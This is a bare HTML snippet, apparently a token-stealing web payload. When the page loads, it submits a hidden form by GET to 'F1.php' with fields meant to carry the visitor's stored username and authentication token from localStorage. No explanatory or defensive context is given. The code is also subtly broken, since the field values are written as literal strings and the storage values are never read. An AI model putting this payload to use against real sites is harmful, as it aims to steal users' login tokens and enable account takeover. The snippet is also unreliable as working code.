<html>
<form action="F1.php" method="get" id="key">
<input name="username" type="hidden" value=" localStorage.getItem('username') " id="user">
<input name="auth" type="hidden" value=" localStorage.getItem('token') " id="auth">
</form>
<script>
function keys(){
document.getElementById("key").submit();
}
keys();
</script>
<html>
